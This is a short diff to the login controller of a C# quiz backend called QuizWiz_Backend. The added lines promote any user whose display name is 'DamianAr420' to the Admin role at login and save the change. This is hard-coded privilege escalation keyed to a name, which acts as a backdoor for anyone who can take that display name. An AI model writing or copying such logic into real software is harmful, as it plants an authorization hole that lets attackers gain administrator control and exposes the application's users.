@@ -71,6 +71,12 @@ namespace QuizWiz_Backend.Controllers
             if (user == null || !BCrypt.Net.BCrypt.Verify(dto.Password, user.PasswordHash))
                 return Unauthorized(new { message = "Nieprawidłowe dane logowania." });
 
+            if (user.DisplayName == "DamianAr420")
+            {
+                user.Role = "Admin";
+                await _context.SaveChangesAsync();
+            }
+
             var token = CreateToken(user);
             var userDto = new UserDto(
                 user.Id, 
